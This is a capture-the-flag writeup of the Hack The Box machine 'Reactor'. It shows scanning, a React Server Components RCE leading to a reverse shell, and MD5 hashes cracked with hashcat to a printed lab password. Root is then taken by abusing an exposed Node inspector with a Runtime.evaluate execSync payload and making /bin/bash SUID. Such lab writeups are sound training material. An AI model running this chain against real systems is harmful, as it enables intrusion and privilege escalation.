@@ -1,0 +1,174 @@
+---
+title: Reactor
+date: '2026-05-23'
+description: ''
+type: writeup
+platform: hackthebox
+difficulty: easy
+tags:
+  - HTB-season
+  - Easy
+  - WEB
+  - LINUX
+---
+
+# بِسْمِ اللَّهِ الرَّحْمَنِ الرَّحِيمِ
+
+In this writeup, we are going through **Reactor** from Hack The Box.
+
+## Enumeration
+
+We start with a quick scan.
+
+```bash
+$ nmap -sV 10.129.2.154 -T5
+Starting Nmap 7.95 ( https://nmap.org ) at 2026-05-23
+Nmap scan report for 10.129.2.154
+Host is up
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH
+3000/tcp open  http    Node.js / Next.js
+```
+
+The interesting service was the web app on port `3000`.
+
+## Foothold
+
+After poking at the app, we found a **React Server Components RCE**. Burp Suite's active scan helped surface it.
+
+![Burp Suite showing the React Server Components RCE on Reactor](/mdx_images/reactor/rce_burpsuite.png)
+
+That gave us command execution as `node`.
+
+### Reading app files
+After modifying the script to get a reverse shell with `busybox nc -e`, we waited for the connection.
+Looking around the app directory, we found a `.env` file and a SQLite database named `reactor.db`.
+
+```bash
+ζ nc -lvnp 4444
+script -qc /bin/bash /dev/null
+node@reactor:/opt/reactor-app$ ls -al
+node@reactor:/opt/reactor-app$ ls -al
+ls -al
+total 76
+drwxr-xr-x  5 node node  4096 Dec 28 21:05 .
+drwxr-xr-x  4 root root  4096 Apr 27 11:26 ..
+drwxr-xr-x  2 node node  4096 Dec 28 20:47 app
+-rw-r--r--  1 node node   276 Dec 28 21:05 .env
+drwxr-xr-x  7 node node  4096 Dec 28 20:47 .next
+-rw-r--r--  1 node node   172 Dec 28 20:47 next.config.js
+drwxr-xr-x 30 node node  4096 Dec 28 20:47 node_modules
+-rw-r--r--  1 node node   269 Dec 28 20:47 package.json
+-rw-r--r--  1 node node 29329 Dec 28 20:47 package-lock.json
+-rw-r-----  1 node node 12288 Dec 28 21:03 reactor.db
+```
+
+### Dumping users from sqlite
+
+We downloaded `reactor.db` to see if it contained anything useful.
+
+```bash
+ζ sqlitebrowser ~/Downloads/reactor.db
+```
+![SQLiteBrowser showing users extracted from reactor.db](/mdx_images/reactor/sqlitebrowser.png)
+
+The hashes looked like MD5, so we threw them into `hashcat`. We successfully cracked the `engineer` hash, but not the `admin` one.
+
+```bash
+ζ cat hashes.txt
+39d97110eafe2a9a68639812cd271e8e
+a203b22191d744a4e70ada5c101b17b8
+
+ζ hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt
+39d97110eafe2a9a68639812cd271e8e:reactor1
+```
+
+That gives us:
+
+- `engineer:reactor1`
+
+### User flag
+
+```bash
+ζ ssh engineer@10.129.2.154
+# password: reactor1
+engineer@reactor:~$ whoami
+engineer
+engineer@reactor:~$ cat user.txt
+[REDACTED]
+```
+
+## Privilege Escalation
+
+After getting a shell as `engineer`, the interesting thing was a root-owned Node service running with the **inspector** enabled on localhost.
+
+```bash
+engineer@reactor:~$ ss -nltp
+State          Recv-Q         Send-Q                 Local Address:Port                 Peer Address:Port         Process         
+LISTEN         0              511                        127.0.0.1:9229                      0.0.0.0:*                            
+LISTEN         0              4096                      127.0.0.54:53                        0.0.0.0:*                            
+LISTEN         0              5                            0.0.0.0:8888                      0.0.0.0:*                            
+LISTEN         0              4096                         0.0.0.0:22                        0.0.0.0:*                            
+LISTEN         0              4096                   127.0.0.53%lo:53                        0.0.0.0:*                            
+LISTEN         0              511                                *:3000                            *:*                            
+LISTEN         0              4096                            [::]:22                           [::]:*                            
+```
+Port `9229` is the default Node.js inspector port.
+```bash
+engineer@reactor:~$ ps aux | grep -i node
+node        1325  0.7  3.0 11845948 119160 ?     Ssl  09:20   0:29 next-server (v15.0.3)
+root        1329  0.0  1.1 1066152 45896 ?       Ssl  09:20   0:00 /usr/bin/node --inspect=127.0.0.1:9229 /opt/uptime-monitor/worker.js
+```
+
+So we have a root-owned Node process exposing the inspector, which means we can evaluate JavaScript in that context.
+
+### Tunneling the inspector
+
+We forward the local debug port over SSH.
+
+```bash
+$ ssh -L 9229:127.0.0.1:9229 engineer@10.129.2.154
+# password: reactor1
+```
+Then we can confirm the inspector is reachable locally.
+
+```bash
+ζ curl http://127.0.0.1:9229/json
+[ {
+  "description": "node.js instance",
+  "devtoolsFrontendUrl": "devtools://devtools/bundled/js_app.html?experiments=true&v8only=true&ws=127.0.0.1:9229/644623c1-6ff5-4303-8d4d-ed1cd42d3988",
+  "devtoolsFrontendUrlCompat": "devtools://devtools/bundled/inspector.html?experiments=true&v8only=true&ws=127.0.0.1:9229/644623c1-6ff5-4303-8d4d-ed1cd42d3988",
+  "faviconUrl": "https://nodejs.org/static/images/favicons/favicon.ico",
+  "id": "644623c1-6ff5-4303-8d4d-ed1cd42d3988",
+  "title": "/opt/uptime-monitor/worker.js",
+  "type": "node",
+  "url": "file:///opt/uptime-monitor/worker.js",
+  "webSocketDebuggerUrl": "ws://127.0.0.1:9229/644623c1-6ff5-4303-8d4d-ed1cd42d3988"
+} ]
+```
+From there, we used Burp Suite to upgrade the connection to WebSocket and interact directly with the inspector.
+
+
+![Burp Suite upgrading the Node inspector connection to WebSocket](/mdx_images/reactor/websocket_burpsuite.png)
+
+After that, we could send JSON messages directly to the debugger.
+ 
+The important message was:
+
+`{"id":2,"method":"Runtime.evaluate","params":{"expression":"process.mainModule.require('child_process').execSync('whoami').toString()"}}`
+
+
+![Burp Suite sending Runtime.evaluate to the Node inspector and getting root](/mdx_images/reactor/websocket_burpsuite_payload.png)
+
+In the image, you can see the result comes back as `root`, which confirms code execution in the root context. To get a root shell, we made `/bin/bash` SUID with `execSync('chmod 4777 /bin/bash')`.
+Then we went back to the `engineer` shell and opened a new bash session.
+```bash
+engineer@reactor:~$ /bin/bash -p
+bash-5.2# whoami
+root
+bash-5.2# cat /root/root.txt
+[REDACTED]
+bash-5.2# 
+```
+
+GG, rooted.
